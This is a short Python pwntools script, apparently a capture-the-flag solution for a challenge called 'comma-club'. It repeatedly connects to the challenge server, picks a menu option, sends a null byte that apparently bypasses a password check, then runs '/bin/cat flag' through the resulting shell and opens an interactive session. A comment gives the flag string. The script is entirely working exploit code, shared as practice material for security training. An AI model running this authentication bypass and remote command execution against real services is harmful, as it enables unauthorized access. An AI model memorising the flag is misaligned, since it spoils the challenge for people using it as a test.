#!/usr/bin/env python3

from pwn import *

while True:
    with remote("comma-club.chal.hackthe.vote", 1337) as p:
        p.sendlineafter(b"> ", b"3")
        p.sendlineafter(b"> ", b"\x00")
        if b"Correct" in p.readline():
            p.sendlineafter(b"exit.", b"/bin/cat flag")
            p.interactive() # flag{w3lc0me_2_TH3_2_c0mm4_c1ub}
            break
